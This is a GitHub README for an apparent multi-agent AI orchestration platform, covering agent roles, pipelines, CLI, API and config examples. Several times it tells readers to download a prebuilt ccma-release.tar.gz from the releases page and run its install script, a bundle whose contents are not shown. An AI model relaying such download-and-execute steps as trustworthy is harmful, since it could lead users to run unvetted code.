https://github.com/Nuggethair/Claude-Code-Multi-Agent/releases

# Claude Code Multi-Agent — AI Agent Orchestration for Full Dev Cycle 🚀🤖

[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/Nuggethair/Claude-Code-Multi-Agent/releases)

A context-driven, multi-agent platform that automates software delivery from request to release. The system uses Claude Code style agents that handle requirements, design, code, test, and deployment. It ties prompts, templates, and pipelines into a single, extensible orchestration layer.

- Built for developers and engineering teams.
- Focused on repeatable workflows and traceable outputs.
- Designed to integrate with CI/CD, issue trackers, and cloud providers.

Table of contents
- Overview
- Core concepts
- Key features
- Architecture diagram
- Quick start — download and run
- Install and run (detailed)
- Agent types and roles
- Prompt and context engineering
- Pipelines and orchestration
- CLI reference
- API reference
- Configuration
- Example workflows
- Deployment patterns
- Scaling and observability
- Security model
- Testing and CI integration
- Extending with plugins
- Contributing
- License
- FAQ
- Troubleshooting
- Roadmap
- Credits and resources

Overview
Claude Code Multi-Agent (CCMA) combines context engineering with agent orchestration. It maps a development request to an ordered set of agents that coordinate to deliver a working artifact. Agents share context through structured stores. The platform enforces stage gates and artifacts. You can run the system locally, in a container, or in a cloud cluster.

Core concepts
- Agent: A process that performs a single responsibility. Examples: RequirementsAgent, DesignAgent, CodeAgent, TestAgent, DeployAgent.
- Context: Structured state that agents read and write. Context stores contain user goals, constraints, artifacts, and logs.
- Prompt template: A reusable prompt that an agent uses to generate output.
- Skill: A reusable capability an agent invokes. Skills include code generation, static analysis, test generation, and shell execution.
- Orchestrator: The central coordinator that schedules agents, resolves dependencies, and manages retries.
- Pipeline: A sequence of stages that form a delivery flow from idea to release.
- Artifact: Any product created by agents. Examples: design docs, source code, tests, build artifacts.
- Hook: A callback that runs before or after a stage. Hooks let you integrate external systems, such as issue trackers or CI.

Key features
- End-to-end automation: Move from requirement to deployed artifact with a single pipeline.
- Context engineering: Keep structured context across stages. Reduce prompt drift.
- Agent composition: Combine small agents to build complex behavior.
- Extensible: Add custom agents, skills, and hooks.
- Observability: Trace context changes and agent outputs. Export logs and metrics.
- Safe rollouts: Add stage gates and human approvals in any pipeline.
- CI/CD friendly: Export artifacts and run tests in CI.

Architecture diagram
![Architecture](https://raw.githubusercontent.com/Nuggethair/Claude-Code-Multi-Agent/main/docs/assets/architecture-diagram.png)

- Agents run as separate services or worker processes.
- The orchestrator coordinates tasks and stores context in a persistent backend.
- Agents call the Claude-style model for reasoning and code generation.
- Observability hooks send events to telemetry, logs, and dashboards.

Quick start — download and run
Download the release bundle, extract it, and run the installer. The release file contains a prebuilt orchestrator, agent definitions, and a sample pipeline.

Download and run:
1. Visit the releases page and get the latest bundle:
   https://github.com/Nuggethair/Claude-Code-Multi-Agent/releases
2. Download the file named ccma-release.tar.gz from the Releases page.
3. Extract and run the installer:
   - Linux / macOS
     ```bash
     tar xzf ccma-release.tar.gz
     cd ccma-release
     ./install.sh
     ./run-local.sh
     ```
   - Docker
     ```bash
     docker load -i ccma-image.tar
     docker run -p 8080:8080 ccma:latest
     ```
   - Windows (PowerShell)
     ```powershell
     tar -xzf ccma-release.tar.gz
     cd ccma-release
     .\install.ps1
     .\run-local.ps1
     ```

The installer sets up a local context store, starts the orchestrator, and launches default agents. After startup, open the UI at http://localhost:8080.

Install and run (detailed)
Prerequisites
- Docker (optional)
- Node.js 18+ for the UI
- Python 3.10+ for local agent workers
- 4 GB RAM for small test runs
- Network access to model endpoints if you use hosted models

Local dev workflow
1. Clone or download the release bundle and extract it.
2. Inspect config at ./config/default.yaml. Adjust model endpoints and API keys.
3. Start the context store:
   - SQLite for local dev (default).
   - PostgreSQL for production.
4. Start orchestrator:
   ```bash
   ./bin/orchestrator --config ./config/default.yaml
   ```
5. Launch agents:
   ```bash
   ./bin/agent --role RequirementsAgent --config ./config/agents/requirements.yaml
   ./bin/agent --role CodeAgent --config ./config/agents/code.yaml
   ```
6. Interact via CLI or UI.

Docker
- Build:
  ```bash
  docker build -t ccma:local .
  ```
- Run single-node compose:
  ```bash
  docker-compose -f docker/docker-compose.dev.yaml up --build
  ```

Kubernetes
- Helm chart lives in ./deploy/helm/ccma.
- For minimal cluster:
  ```bash
  helm install ccma ./deploy/helm/ccma --namespace ccma --create-namespace
  ```
- Monitor pods:
  ```bash
  kubectl get pods -n ccma
  ```

Agent types and roles
RequirementsAgent
- Capture user intent.
- Validate constraints.
- Output structured requirements in JSON.

DesignAgent
- Create high-level design and component diagrams.
- Produce API contracts and data models.

CodeAgent
- Generate source code from design.
- Use templates for project scaffolding.
- Run static checks.

TestAgent
- Produce unit and integration tests.
- Create test harnesses and sample fixtures.

BuildAgent
- Build artifacts using standard toolchains.
- Support Maven, Gradle, npm, pip, and custom builders.

DeployAgent
- Create deployment manifests.
- Execute deployments to Kubernetes or cloud providers.

MonitorAgent
- Add monitoring hooks.
- Create dashboards and alerts.

HumanApprovalAgent
- Pause pipeline and request human signoff.
- Send messages to Slack, email, or issue trackers.

Prompt and context engineering
This platform relies on clear context shapes. A small change in context can steer generation. Keep prompts small and explicit. Use templates and structured fields.

Context store example (JSON)
```json
{
  "project_id": "proj-123",
  "request": {
    "title": "Create REST API for orders",
    "constraints": ["use-postgres", "deploy-k8s"],
    "priority": "medium"
  },
  "design": {
    "endpoints": [
      {"path": "/orders", "method": "POST"},
      {"path": "/orders/{id}", "method": "GET"}
    ]
  },
  "artifacts": {
    "repo_url": "git@github.com:example/orders.git"
  }
}
```

Prompt template example
- Template name: code-gen-basic
- Purpose: Generate a REST controller from interface spec.
- Use placeholders for data models, routes, and language.

Pipelines and orchestration
A pipeline is a DAG of stages. Each stage maps to an agent or group of agents. Pipelines enforce inputs and outputs.

Sample pipeline: new-feature
1. Capture request (RequirementsAgent)
2. Validate design options (DesignAgent)
3. Generate code scaffold (CodeAgent)
4. Create tests (TestAgent)
5. Run build (BuildAgent)
6. Deploy to staging (DeployAgent)
7. Approval gate (HumanApprovalAgent)
8. Deploy to production (DeployAgent)

Pipelines use conditions. For example, skip the deployment to staging if the request flags dry-run.

CLI reference
Start a pipeline
```bash
ccma pipeline start --name new-feature --context ./contexts/feature-42.json
```

Get pipeline status
```bash
ccma pipeline status --id <pipeline-id>
```

List agents
```bash
ccma agent list
```

Trigger agent manually
```bash
ccma agent run --role TestAgent --context ./contexts/feature-42.json
```

Export artifacts
```bash
ccma artifact export --id artifact-123 --output ./exports
```

API reference
Base path: /api/v1

Endpoints
- POST /pipelines/start
  - Body: { pipeline: "new-feature", context: {...} }
  - Returns: { pipeline_id }

- GET /pipelines/{id}/status
  - Returns: pipeline progress and stage logs.

- POST /agents/{role}/run
  - Body: context object
  - Returns: agent execution result.

- GET /artifacts/{id}
  - Download artifact.

- POST /hooks/{hook}/trigger
  - Trigger external integration.

Examples
1. Generate a sample microservice
- Use the built-in template sample-microservice.
- Command:
  ```bash
  ccma pipeline start --name sample-microservice --context ./contexts/sample-microservice.json
  ```
- Output:
  - Repo scaffold
  - Dockerfile
  - CI config
  - Unit tests

2. Create a feature branch and PR
- Start pipeline with feature request.
- After CodeAgent runs, the system pushes a branch to the connected repo.
- It opens a pull request and posts the PR link in the pipeline log.

3. Nonfunctional requirement: low-latency
- Add constraint "max-latency-ms: 50" to request context.
- DesignAgent picks a high-perf architecture.
- CodeAgent picks async patterns and low-overhead libs.

Configuration
Config uses YAML. Key sections:
- models: model endpoints, API keys, rate limits
- agents: agent-specific settings
- orchestrator: task queue and concurrency
- persistence: context store and artifact store
- integrations: Git, Slack, Jira, cloud providers

Sample config fragment
```yaml
models:
  default:
    provider: "anthropic"
    endpoint: "https://api.anthropic.com/v1"
    api_key: "${ANTHROPIC_KEY}"
agents:
  CodeAgent:
    concurrency: 2
    timeout_seconds: 120
orchestrator:
  queue: "redis://localhost:6379"
persistence:
  type: sqlite
  path: "./data/ccma.db"
integrations:
  github:
    token: "${GITHUB_TOKEN}"
```

Deployment patterns
- Single-node dev: Use SQLite and local agents. Good for testing.
- Docker compose: Start a small Redis, SQLite, and orchestrator. Use for small teams.
- Kubernetes: Use StatefulSets for agents, Deployments for orchestrator, and a managed DB.
- Hybrid: Keep the orchestrator in the cloud and run agents in your VPC for secure access to private systems.

Scaling and observability
Scale horizontally
- Run multiple agent workers of the same type.
- Use the orchestrator to set concurrency limits.
- Use a message queue for task dispatch.

Observability
- Metrics: expose Prometheus metrics at /metrics.
- Tracing: use OpenTelemetry for request traces.
- Logs: structured JSON logs with context_id and pipeline_id.
- Artifact audit: every artifact stores provenance metadata.

Security model
- Secrets: use a secrets provider. Do not store API keys in plain config files.
- Principle of least privilege: agents get scoped credentials for integrations.
- Approval gates: require human sign-off for production deploys.
- Audit logs: keep a tamper-evident audit trail of agent actions.

Testing and CI integration
- Unit test agents with offline prompts and mock model responses.
- Integration tests run pipelines against a sandbox environment.
- CI:
  - Use a pipeline to generate code.
  - Run tests and linting.
  - Build artifacts and push to registry.
  - Promote successful builds automatically.

Extending with plugins
- Implement a new agent by adding a handler class and a YAML manifest.
- Add skills as shared libraries.
- Build hooks that call external REST APIs.

Example agent manifest (YAML)
```yaml
name: CustomAgent
role: CustomAgent
entrypoint: custom_agent.main:run
description: "Agent that performs domain-specific tasks"
capabilities:
  - prompts
  - code-run
  - artifact-write
```

Contributing
- Fork the repo.
- Create a feature branch.
- Add tests.
- Submit a pull request with a clear description.
- Keep changes small and focused.

Guidelines
- Keep prompts templated and testable.
- Add unit tests for agent handlers.
- Document changes in docs/ and keep examples updated.

License
- This project uses the MIT license. See LICENSE file for details.

FAQ
Q: What models does the platform support?
A: Any model with a standard LLM API. The default setup uses a Claude-compatible endpoint. You can configure other providers.

Q: Can I run agents offline?
A: Yes. Configure a local model server or mock the model outputs for tests.

Q: Is there a UI?
A: The release bundle includes a minimal UI that shows pipelines, agent logs, and artifacts.

Q: How do I add a human approval step?
A: Add HumanApprovalAgent to your pipeline. Configure Slack or email hooks.

Troubleshooting
- Orchestrator fails to start
  - Check config/default.yaml for malformed YAML.
  - Verify DB connection string.
- Agent times out
  - Increase timeout in the agent config.
  - Check model endpoint latency.
- Pipeline stalls at approval
  - Ensure the human approval channel is configured.
  - Confirm recipients have access.

Roadmap
- More official agents for cloud providers and infra as code.
- Built-in templates for common architectures.
- Better local model support and plug-and-play connectors.
- Fine-grained access controls and role-based policies.
- Marketplace for community agents and templates.

Changelog
- 0.1.0 — Initial release with orchestrator and core agents.
- 0.2.0 — Added CI integrations and sample pipelines.
- 0.3.0 — Improved context store and observability.

Credits and resources
- Core idea: context engineering and agent orchestration.
- Model integration: Claude-style prompts.
- Community contributions and sample templates.

Assets and images
- Architecture diagram: docs/assets/architecture-diagram.png
- Hero image (AI agents): https://images.unsplash.com/photo-1555949963-aa79dcee981d
- Agent icon set: https://raw.githubusercontent.com/Nuggethair/Claude-Code-Multi-Agent/main/docs/assets/agent-icons.png

Releases and downloads
A release bundle lives on the releases page. Download the bundle and run the installer to bootstrap a working instance that includes the orchestrator, default agents, and sample pipelines.

Download now:
[Download Releases](https://github.com/Nuggethair/Claude-Code-Multi-Agent/releases)

When you download, get the file named ccma-release.tar.gz. Extract the bundle and run the included installer script:
```bash
tar xzf ccma-release.tar.gz
cd ccma-release
./install.sh
```

Security and safe usage
- Run agents in isolated environments if they need access to secrets.
- Apply RBAC and network policies for production.
- Use staging pipelines for untrusted requests.

Integrations
- GitHub: trigger PRs, push branches, store artifacts.
- Jira: open tickets and track pipeline status.
- Slack: post pipeline updates and approval requests.
- Docker Registry: push build artifacts.
- Kubernetes: deploy artifacts via manifests.

Sample integration: GitHub
1. Add a GitHub token to config.
2. Configure repo template.
3. The CodeAgent will push scaffolded code to a branch and open a PR.

Sample CI file (GitHub Actions)
```yaml
name: ccma-ci
on:
  push:
    branches:
      - main
jobs:
  run-pipeline:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Start pipeline
        run: |
          curl -X POST -H "Content-Type: application/json" \
            -d '{"pipeline":"ci-build","context":{}}' \
            http://ccma.local/api/v1/pipelines/start
```

Best practices
- Keep prompts deterministic and test them.
- Use small, focused agents.
- Keep context minimal and typed.
- Write clear stage contracts for inputs and outputs.
- Version your templates and agents.

Common patterns
- Feature automation: Keep human review for production or sensitive code.
- Security patching: Run security-focused agents that scan dependencies and patch versions.
- Compliance checks: Add agents that assert compliance rules before deployment.

Example: Full flow for a new feature
1. A product manager opens a request in the UI or via CLI.
2. RequirementsAgent parses the request and fills structured context.
3. DesignAgent proposes an architecture and data model.
4. CodeAgent generates scaffold and opens a branch.
5. TestAgent creates tests based on contract.
6. BuildAgent builds a container and pushes it to registry.
7. DeployAgent deploys to staging.
8. HumanApprovalAgent requests signoff.
9. DeployAgent deploys to production.

Metrics to track
- Pipeline lead time.
- Time per agent stage.
- Model call latency and cost.
- Failure rate per stage.
- Artifacts promoted per day.

Developer tips
- Start with the sample pipeline to learn the flow.
- Mock model outputs for unit tests.
- Keep agent logic thin and move heavy logic to skills.

Common pitfalls
- Overly broad prompts cause inconsistent output. Use structured templates.
- Large context can slow model calls. Trim and include only needed fields.
- Tightly coupled agents reduce reuse. Design agents around single responsibilities.

Maintenance
- Keep model credentials rotated.
- Update templates when you change style guides.
- Run periodic pipeline audits to ensure compliance.

Community
- Share templates and agents in a marketplace or a shared repo.
- Contribute sample pipelines that solve common problems.

Credits
- Build on ideas from Claude-style agent orchestration and context engineering.
- Icons and images come from public assets and contributor uploads.

Contact
- Open issues in the repository for bugs and feature requests.
- Submit pull requests for improvements and new agents.

End of file